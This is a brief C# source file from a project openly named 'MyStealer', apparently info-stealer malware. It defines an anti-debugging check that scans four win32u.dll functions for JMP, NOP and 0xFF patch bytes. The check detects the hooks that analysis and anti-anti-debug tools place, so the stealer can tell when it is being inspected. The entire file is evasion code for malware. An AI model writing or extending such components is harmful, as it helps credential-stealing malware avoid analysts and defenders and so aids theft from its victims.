namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
{
    internal class Win32UCheck : HookCheckBase
    {
        public override string Name => "Hooking: win32u";

        protected override string DllName => "win32u.dll";

        protected override string[] ProcNames => new string[]
        {
            "NtUserBlockInput",
            "NtUserFindWindowEx",
            "NtUserQueryWindow",
            "NtUserGetForegroundWindow"
        };

        protected override byte[] BadOpCodes => new byte[] { 255, 0x90, 0xE9 };
    }
}
